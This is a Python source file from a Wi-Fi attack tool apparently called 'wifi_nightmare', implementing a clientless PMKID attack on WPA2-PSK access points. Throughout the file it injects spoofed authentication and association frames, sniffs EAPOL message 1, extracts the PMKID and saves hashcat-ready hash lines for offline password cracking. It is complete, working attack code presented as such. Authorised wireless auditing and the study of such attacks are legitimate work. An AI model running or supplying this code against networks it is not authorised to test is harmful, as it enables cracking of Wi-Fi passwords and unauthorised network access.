# pmkid_attack.py
"""
PMKID Attack — Clientless WPA2 hash harvesting.
Captures PMKID from EAPOL Association frames without requiring a connected client.
Compatible with hcxdumptool and manual scapy-based harvesting.
"""
import os
import sys
import time
import threading
import struct
from dataclasses import dataclass, field
from typing import Optional, List

try:
    from scapy.all import (
        sniff, sendp, RadioTap, Dot11, Dot11Auth, Dot11AssoReq, EAPOL, Dot11Elt
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET
from wifi_nightmare.logger import logger


@dataclass
class PMKIDResult:
    bssid: str
    client_mac: str
    pmkid: str          # hex string, 32 characters (16 bytes)
    ssid: str
    timestamp: float = field(default_factory=time.time)
    hc22000_line: str = ""  # ready for hashcat -m 22000


def build_pmkid_hash_line(ssid: str, bssid: str, client_mac: str, pmkid_hex: str) -> str:
    """Build a hashcat -m 22000 compatible line.
    Format: WPA*01*pmkid*bssid*client*ssid_hex*
    """
    ssid_hex = ssid.encode('utf-8', errors='ignore').hex()
    bssid_hex = bssid.replace(':', '').replace('-', '').lower()
    client_hex = client_mac.replace(':', '').replace('-', '').lower()
    return f"WPA*01*{pmkid_hex}*{bssid_hex}*{client_hex}*{ssid_hex}***"


class PMKIDAttack:
    """
    Active PMKID Harvesting Attack.

    Strategy:
      1. Send spoofed 802.11 Association Request to the target AP.
      2. AP responds with EAPOL Message-1 containing the PMKID in the RSN IE / KDE.
      3. Extract PMKID from EAPOL frame.
      4. Save as .hc22000 for hashcat cracking.

    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)
    Since PMK = PBKDF2(password, SSID), the PMKID can be cracked offline.
    """

    def __init__(self, interface: str, bssid: str, channel: int, ssid: str,
                 timeout: int = 30, output_dir: str = None):
        self.interface = interface
        self.bssid = bssid.lower()
        self.channel = channel
        self.ssid = ssid
        self.timeout = timeout
        self.output_dir = output_dir or os.path.expanduser("~/.wifi-nightmare/handshakes")
        os.makedirs(self.output_dir, exist_ok=True)

        self.results: List[PMKIDResult] = []
        self.stop_event = threading.Event()
        self._lock = threading.Lock()
        self.fake_mac = "02:00:00:11:22:33"  # Locally administered STA MAC

    def _build_auth_request(self) -> bytes:
        """Build an 802.11 Open System Authentication frame (Seq 1)."""
        if not HAS_SCAPY:
            return b""
        dot11 = (
            RadioTap() /
            Dot11(type=0, subtype=11,
                  addr1=self.bssid,
                  addr2=self.fake_mac,
                  addr3=self.bssid) /
            Dot11Auth(algo=0, seqnum=1, status=0)
        )
        return dot11

    def _build_assoc_request(self) -> bytes:
        """Build a minimal 802.11 Association Request targeting the AP."""
        if not HAS_SCAPY:
            return b""
        dot11 = (
            RadioTap() /
            Dot11(type=0, subtype=0,
                  addr1=self.bssid,
                  addr2=self.fake_mac,
                  addr3=self.bssid) /
            Dot11AssoReq(cap=0x0431, listen_interval=10) /
            Dot11Elt(ID='SSID', info=self.ssid.encode('utf-8', errors='ignore')) /
            Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
            Dot11Elt(ID=48, info=  # RSN IE requesting WPA2-PSK
                b'\x01\x00'          # RSN Version
                b'\x00\x0f\xac\x04'  # Group cipher: CCMP
                b'\x01\x00'          # Pairwise cipher count
                b'\x00\x0f\xac\x04'  # Pairwise: CCMP
                b'\x01\x00'          # AKM count
                b'\x00\x0f\xac\x02'  # AKM: PSK
                b'\x00\x00'          # RSN Capabilities
            )
        )
        return dot11

    def _extract_pmkid_from_eapol(self, payload: bytes) -> Optional[str]:
        """
        Parse EAPOL Message-1 (AP -> STA) to find PMKID in RSN KDE.
        PMKID KDE OUI: 00-0F-AC, data type: 4
        """
        try:
            if len(payload) < 99:
                return None
            key_data_len = struct.unpack('!H', payload[97:99])[0]
            if key_data_len == 0 or len(payload) < 99 + key_data_len:
                return None
            key_data = payload[99:99 + key_data_len]

            # Search for PMKID KDE: OUI 00:0F:AC, type 4
            i = 0
            while i < len(key_data) - 6:
                kde_type = key_data[i]
                kde_len = key_data[i + 1]
                if kde_type == 0xdd and kde_len >= 20:
                    oui = key_data[i+2:i+5]
                    data_type = key_data[i+5]
                    if oui == b'\x00\x0f\xac' and data_type == 4:
                        pmkid = key_data[i+6:i+22]
                        if len(pmkid) == 16:
                            return pmkid.hex()
                i += 2 + kde_len if kde_len > 0 else 1
        except Exception as e:
            logger.debug(f"PMKID extraction error: {e}")
        return None

    def _packet_handler(self, pkt):
        if self.stop_event.is_set():
            return
        if not pkt.haslayer(EAPOL):
            return
        client = self.fake_mac
        if pkt.haslayer(Dot11):
            src = pkt[Dot11].addr2
            if src and src.lower() != self.bssid:
                return
            if pkt[Dot11].addr1:
                client = pkt[Dot11].addr1

        try:
            raw = bytes(pkt[EAPOL])
            pmkid_hex = self._extract_pmkid_from_eapol(raw)
            if pmkid_hex:
                hc_line = build_pmkid_hash_line(self.ssid, self.bssid, client, pmkid_hex)
                result = PMKIDResult(
                    bssid=self.bssid,
                    client_mac=client,
                    pmkid=pmkid_hex,
                    ssid=self.ssid,
                    hc22000_line=hc_line
                )
                with self._lock:
                    known = {r.pmkid for r in self.results}
                    if pmkid_hex not in known:
                        self.results.append(result)
                        self._save_result(result)
                        print(f"\n{C_GREEN}[+] PMKID Captured!{C_RESET}")
                        print(f"    BSSID  : {self.bssid}")
                        print(f"    PMKID  : {pmkid_hex}")
                        print(f"    Hashcat: {hc_line}")
                self.stop_event.set()
        except Exception as e:
            logger.debug(f"PMKID handler error: {e}")

    def _save_result(self, result: PMKIDResult) -> str:
        """Save PMKID to .hc22000 file for hashcat."""
        safe_ssid = ''.join(c for c in result.ssid if c.isalnum() or c in '-_') or "network"
        clean_bssid = result.bssid.replace(':', '').replace('-', '')
        filename = os.path.join(self.output_dir, f"pmkid_{safe_ssid}_{clean_bssid}.hc22000")
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(result.hc22000_line + '\n')
        print(f"{C_CYAN}    Saved : {filename}{C_RESET}")
        return filename

    def run(self) -> List[PMKIDResult]:
        if not HAS_SCAPY:
            print(f"{C_RED}[!] Scapy not installed. Cannot run PMKID attack.{C_RESET}")
            return []

        print(f"\n{C_CYAN}[*] PMKID Attack started on {self.ssid} ({self.bssid}){C_RESET}")
        print(f"{C_YELLOW}[*] Sending Association Requests & listening for EAPOL M1...{C_RESET}")
        print(f"{C_YELLOW}[*] Timeout: {self.timeout}s | Ctrl+C to stop{C_RESET}")

        def _inject_loop():
            auth_pkt = self._build_auth_request()
            assoc_pkt = self._build_assoc_request()
            start = time.time()
            while not self.stop_event.is_set() and time.time() - start < self.timeout:
                try:
                    # Step 1: 802.11 Open System Authentication
                    sendp(auth_pkt, iface=self.interface, verbose=0)
                    time.sleep(0.05)
                    # Step 2: 802.11 Association Request with WPA2-PSK RSN IE
                    sendp(assoc_pkt, iface=self.interface, verbose=0)
                except Exception:
                    pass
                time.sleep(0.8)

        inject_thread = threading.Thread(target=_inject_loop, daemon=True)
        inject_thread.start()

        start = time.time()
        while not self.stop_event.is_set() and time.time() - start < self.timeout:
            elapsed = int(time.time() - start)
            remaining = max(0, self.timeout - elapsed)
            sys.stdout.write(f"\r{C_YELLOW}[*] Listening... {elapsed}s elapsed | {remaining}s remaining | PMKIDs: {len(self.results)}{C_RESET}  ")
            sys.stdout.flush()
            try:
                sniff(iface=self.interface, prn=self._packet_handler,
                      count=0, timeout=1, store=0,
                      stop_filter=lambda p: self.stop_event.is_set())
            except Exception as e:
                logger.debug(f"Sniff error: {e}")

        self.stop_event.set()
        print(f"\n{C_GREEN}[+] PMKID Attack finished. Captured: {len(self.results)}{C_RESET}")
        return self.results

    def stop(self):
        self.stop_event.set()
